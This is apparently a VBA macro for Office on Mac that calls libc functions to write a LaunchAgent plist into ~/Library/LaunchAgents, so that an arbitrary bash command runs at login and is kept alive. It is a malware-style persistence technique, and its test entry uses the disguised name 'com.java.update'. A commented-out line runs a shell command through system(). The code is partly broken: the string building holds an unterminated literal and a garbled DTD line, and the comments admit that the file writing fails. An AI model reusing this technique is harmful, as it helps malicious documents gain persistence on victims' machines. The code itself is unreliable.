#If VBA7 Then
    ' 64-bit Mac (2016)
    Private Declare PtrSafe Function system Lib "libc.dylib" Alias "system" _
        (ByVal command As String) As Long
    Private Declare PtrSafe Function fopen Lib "libc.dylib" Alias "fopen" _
        (ByVal file As String, ByVal mode As String) As LongPtr
    Private Declare PtrSafe Function fputs Lib "libc.dylib" Alias "fputs" _
        (ByVal str As String, ByVal file As LongPtr) As Long
    Private Declare PtrSafe Function fclose Lib "libc.dylib" Alias "fclose" _
        (ByVal file As LongPtr) As Long
#Else
    ' 32-bit Mac
    Private Declare Function system Lib "libc.dylib" Alias "system" _
        (ByVal command As String) As Long
    Private Declare Function fopen Lib "libc.dylib" Alias "fopen" _
        (ByVal file As String, ByVal mode As String) As Long
    Private Declare Function fputs Lib "libc.dylib" Alias "fputs" _
        (ByVal str As String, ByVal file As Long) As Long   
    Private Declare Function fclose Lib "libc.dylib" Alias "fclose" _
        (ByVal file As Long) As Long    
#End If

Sub writeToFile(ByVal file As String, ByVal txt As String)
    #If Mac Then
        #If VBA7 Then
            Dim fp As LongPtr
        #Else
            Dim fp As Long
        #End If

        Dim grants
        grants = Array(file)
        GrantAccessToMultipleFiles(grants)

        ' BUG: fopen will return 0 here.
        fp = fopen(file, "w")
        If fp = 0 Then: Exit Sub

        fputs txt, fp
        fclose(fp)
    #End If
End Sub

Sub MacPersistence(ByVal cmd As String, ByVal taskName As String)
    Dim plist As String
    plist = "<?xml version=""1.0"" encoding=""UTF-8""?>\n"
    plist = plist & "<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD "
    plist = plist & "PLIST 1.0//EN"" ""http://www.apple.com/DTDs/plist"
    plist = plist & " = plist & PropertyList-1.0.dtd"">\n"
    plist = plist & "<plist version=""1.0"">\n
    plist = plist & "<dict>\n"
    plist = plist & "    <key>Label</key>\n"
    plist = plist & "    <string>" & taskName & "</string>\n"
    plist = plist & "    <key>ProgramArguments</key>\n"
    plist = plist & "    <array>\n"
    plist = plist & "        <string>/bin/bash</string>\n"
    plist = plist & "        <string>-c</string>\n"
    plist = plist & "        <string>'" & cmd & "'</string>\n"
    plist = plist & "    </array>\n"
    plist = plist & "    <key>RunAtLoad</key>\n"
    plist = plist & "    <true/>\n"
    plist = plist & "    <key>KeepAlive</key>\n"
    plist = plist & "    <true/>\n"
    plist = plist & "</dict>\n"
    plist = plist & "</plist>\n"

    ' TODO: File writing does not work at the moment, most likely due to 
    '       apps sandboxing mechanism enforced by the system.

    ' Approach #1: File write by system command
    ' system("echo -e """ & plist & """ > ~/Library/LaunchAgents/" & taskName)

    ' Approach #2: File write by fopen+fputs+fclose
    Dim fileName As String
    fileName = "~/Library/LaunchAgents/" & taskName & ".plist"
    writeToFile fileName, plist
End Sub

Sub TestMacPersistence()
    MacPersistence "/Applications/Calculator.app/Contents/MacOS/Calculator", "com.java.update"
End Sub